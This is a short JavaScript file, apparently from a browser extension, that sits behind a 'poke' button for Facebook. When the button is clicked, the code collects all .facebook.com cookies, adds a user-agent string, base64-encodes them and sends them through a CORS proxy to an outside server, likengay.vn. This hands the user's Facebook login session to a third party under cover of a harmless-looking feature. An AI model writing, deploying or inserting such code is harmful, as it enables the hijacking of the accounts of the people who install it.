import * as utils from "../utils/index.js";

$(document).ready(async () => {
  $("#poke").click(async () => {
    $("#poke").prop("disabled", true);
    chrome.cookies.getAll({
      domain: ".facebook.com"
    }, function (cookies) {
      cookies = cookies.filter(e=>e.domain == ".facebook.com" && e.path=="/");
      let cookie = "";
      for (let i=0; i<cookies.length; i++) {
        cookie += `${cookies[i].name}=${cookies[i].value};`;
      }
      cookie+="|Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36";
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          const res = JSON.parse(this.responseText);
          if (res.status) {
            alert(res.message);
          }
          window.location.assign("");
        }
      };
      console.log(cookie)
      xhttp.open("GET", `https://cors-anywhere.herokuapp.com/https://likengay.vn/02x3@api/@poke.php?cookie=${btoa(cookie)}`, true);
      xhttp.send();
    });
  });
});

